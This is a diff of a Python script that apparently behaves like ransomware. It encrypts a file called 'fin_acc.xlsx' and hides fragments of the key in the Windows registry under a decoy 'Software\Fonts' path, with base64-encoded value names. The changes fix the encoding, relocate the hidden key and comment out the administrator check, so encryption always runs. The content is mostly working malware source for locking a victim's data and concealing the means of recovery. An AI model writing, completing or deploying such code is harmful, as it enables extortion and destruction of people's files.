@@ -8,17 +8,17 @@ class hideKey():
     def __init__(self, adj_key: list):
 
         self.adj_key = adj_key
-        self.REG_PATH = r'Conrol Panel\Keyboard'
+        self.REG_PATH = r'Software\Fonts'
         self.run()
 
     @staticmethod
     def set_reg(name, value, REG_PATH):
         try:
 
-            winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
+            winreg.CreateKey(winreg.HKEY_CURRENT_CONFIG, REG_PATH)
 
             registry_key = winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER,
+                winreg.HKEY_CURRENT_CONFIG,
                 REG_PATH,
                 0,
                 winreg.KEY_WRITE
@@ -34,14 +34,13 @@ class hideKey():
 
     def run(self):
 
-        for num in range(5):
-
+        for num in range(4):
+            name = base64.b64encode(str(num).encode())
             hideKey.set_reg(
-                name=base64.b64encode(num),
-                value=self.adj_key[num],
+                name=name.decode(),
+                value=self.adj_key[num].decode(),
                 REG_PATH=self.REG_PATH,
             )
-
 
 class encryptFile():
 
@@ -99,12 +98,14 @@ def is_admin():
 
 if __name__ == "__main__":
 
-    if is_admin():
-        encryptFile(
-            filename="fin_acc.xlsx",
-            key=keyGenerator.gen_key()
-        ).run()
+    key = keyGenerator.gen_key()
 
-        hideKey(
-            adj_key=keyGenerator.adj_key()
-        ).run()
+    # if is_admin():
+    encryptFile(
+        filename="fin_acc.xlsx",
+        key=key
+    ).run()
+
+    hideKey(
+        adj_key=keyGenerator.adj_key(key)
+    ).run()
